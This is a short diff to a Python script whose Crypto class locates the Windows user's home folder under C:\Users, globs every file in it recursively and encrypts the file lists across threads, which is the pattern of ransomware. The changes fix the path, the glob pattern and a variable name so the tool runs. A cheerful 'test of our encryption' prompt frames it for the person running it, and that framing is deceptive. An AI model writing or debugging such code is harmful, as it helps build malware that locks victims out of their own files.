@@ -8,7 +8,7 @@ from os import path, getlogin, scandir
 from string import ascii_uppercase
 from threading import Thread
 
-MAIN_DRIVE = 'C:\\\\'
+MAIN_DRIVE = 'C:\\'
 WINDOWS_USERS_DIR = 'Users'
 
 
@@ -28,7 +28,7 @@ class Crypto():
         return home_dir
 
     def get_files(self):
-        return glob.glob(self.home_directory + '\\**\\', recursive=True)
+        return glob.glob(self.home_directory + '\**', recursive=True)
 
     def encrypt_file_list(self, file_list):
         chunks = self.num_threads
@@ -65,5 +65,5 @@ if __name__ == "__main__":
     user_crypt = Crypto(32, 16)
     print("What's up friends. Here's a test of our encryption / decryption with a nice new rando key. Throw a file in there just in case you dont trust us")
     enc_filename = input('File to be encrypted: ')
-    user_crypt.encrypt_file(filename)
-    user_crypt.decrypt_file(filename)
+    user_crypt.encrypt_file(enc_filename)
+    user_crypt.decrypt_file(enc_filename)
